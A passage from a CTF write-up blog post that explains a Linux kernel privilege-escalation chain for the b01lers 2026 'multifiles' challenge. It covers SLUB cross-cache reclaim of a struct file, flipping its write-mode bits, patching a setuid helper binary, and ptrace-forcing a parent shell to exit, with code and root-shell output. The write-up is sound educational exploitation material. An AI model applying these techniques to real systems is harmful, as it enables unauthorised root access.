int fake = mf_create(fake_store, "pad");  // pops A+0xfc0 -> the fake object
```

`fake` is a perfectly legal `MultiFile` whose body runs off the end of `A`. Its `data` starts at `A+0xfe0`, so `data[4]` is `A+0x1000 = B+0` — the first object on the next page. There's one rule for using it: the copy has to *start* on `A`, or the membership check trips. `f_pos=0x1f` puts the base at `A+0xfff` (the last byte of `A`) and spills the following `0x40` bytes into `B`, so every `B` field comes back at `buf[1 + offset]` — a one-byte shift we just carry around.

That's the primitive: a controlled read/write into the physical page right after `A`. Now we make that page hold something worth corrupting.

### Reclaiming B as a struct file

`B` is full of our `MultiFile`s. To hand its page to another cache we drain it back to the buddy allocator and lean on SLUB's discard policy. With `CONFIG_SLUB_CPU_PARTIAL` the per-cpu partial list holds ~10 slabs and the node keeps `min_partial = 5` empties; past that, freeing an empty slab discards its page to buddy. So we turn a batch of full pages into empties — 11 to warm the cpu-partial chain, then `B` plus 9 more to push the discard through:

```c
for (i = 0; i < WARMUP_EMPTY_PAGES; i++) free_full_page(fds, press[i]);       // 11
free_full_page(fds, bp);                                                      // B
for (i = 0; i < TARGET_EMPTY_PAGES - 1; i++) free_full_page(fds, press[11+i]);// 9
```

Then we poison `A`'s tail and realize the fake object exactly as before — only now its body straddles into `B`'s *freed* physical page. Spraying `open("/bin/drop_priv", O_RDONLY|O_NONBLOCK)` makes `filp_cachep` reclaim that page; the first `struct file` lands at `B+0`, right under the fake object. After each open we read the straddle window (`f_pos=0x1f`, so `B+x` is at `buf[1+x]`) and test for the file: `f_mode` is `READ|CAN_READ` with no `WRITE`, `f_op`/`f_mapping`/`f_inode` look like kernel pointers, `private_data == 0`, and `f_flags == O_NONBLOCK|O_LARGEFILE`.

```sh
[+] B reclaimed as /bin/drop_priv struct file after 188 opens
    f_mode=0x004a801d f_flags=0x00008800 f_op=0xffffffff95c1acc0
```

### From f_mode to a root shell

`vfs_write()` gates on the write bits in `file->f_mode`, and we have a write primitive into that exact `struct file`, so we OR them in through the straddle window:

```c
mode |= FMODE_WRITE | FMODE_PWRITE | FMODE_CAN_WRITE;   // at buf[1 + 0x0c]
mf_write(fake_store, fake, 0x1f, buf, 0x40);
```

The read-only fd we opened is now writable. `/bin/drop_priv` just `setuid(1000)`s and `exec`s a shell, so we only need its two `1000` immediates to become `0`. We find them by scanning the binary for the `mov edi, 1000 ; call` pattern (offsets `0x1514`, `0x152f` here) and `pwrite` zeros over them:

```c
patch_drop_priv_fd(target_fd, poff, npoff);   // pwrite 0x00000000 over each 0x000003e8
```

Then the handoff. The initrd's `init` is an infinite `while true; do /bin/drop_priv; done`, so we just need the current (uid 1000) shell to exit and the loop re-runs the patched binary. We `ptrace` the parent shell and rewrite its registers to `exit_group(0)`, pointing `rip` at a `syscall; ret` in its vDSO:

```c
make_parent_exit_zero();   // ATTACH parent; rax=__NR_exit_group, rdi=0, rip=vdso syscall;ret
```

This needs no privileges, which surprised me at first. At this point we're still uid 1000 and so is the parent shell, and same-uid `ptrace` is unprivileged — you only need `CAP_SYS_PTRACE` to attach across a privilege boundary. On top of that this kernel ships without Yama (`CONFIG_SECURITY_YAMA` is unset), so there's no `ptrace_scope` to forbid attaching to an ancestor. If it ever did fail, poking `exit` into the tty with `TIOCSTI` or just `kill`ing the shell would do the same job.

No kernel payload, no `commit_creds`, no KASLR-dependent symbol — just a patched suid-like helper. init respawns the shell through the patched `drop_priv`, and it comes up root:

```sh
[~] root
[+] A=0xffff9de3419c2000  B=0xffff9de3419c3000
[+] drop_priv patch offsets: 0x1514 0x152f
[+] B reclaimed as /bin/drop_priv struct file after 188 opens
[+] flipped FMODE_WRITE on the read-only struct file
    patch[0] off=0x1514 old=0x000003e8
    patch[1] off=0x152f old=0x000003e8
[+] patched /bin/drop_priv
[+] forced parent shell exit(0) -> init respawns a root shell
/home/ctf # id
uid=0(root) gid=0(root) groups=0(root)
```

That's the whole chain: a base-vs-bounds OOB inside one hardened SLUB cache, turned into a heap leak, a freelist forge, a page-straddling fake object, a cross-cache reclaim, and finally a userland binary patch — `bctf{:3}` never needed.

Full source code can be found [here](https://github.com/icctx/ctf/tree/main/b01lers.2026/multifiles/x).

---
# Conclusion

That wraps up both kernel challenges from b01lers 2026. Multifiles was my favorite of the two. Hope it was a useful read.

## References

- [Part 1: throughthewall](https://icctx.xyz/blog/throughthewall/) — the firewall UAF, and the same `/bin/drop_priv` patch finale from a different write primitive.
- KSPP study — [protecting heap metadata](https://samsung.github.io/kspp-study/heap-ovfl.html#protecting-the-integrity-of-heap-metadata): how `SLAB_FREELIST_HARDENED` works.
- duasynt — [Linux kernel heap feng shui in 2022](https://duasynt.com/blog/linux-kernel-heap-feng-shui-2022)
- sam4k — [exploring Linux's random kmalloc caches](https://sam4k.com/exploring-linux-random-kmalloc-caches/)
- [Dirty Pagetable](http://web.archive.org/web/20240203214126/https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html)
- r1ru — [Linux kernel exploitation series](https://r1ru.github.io/categories/linux-kernel-exploitation/)
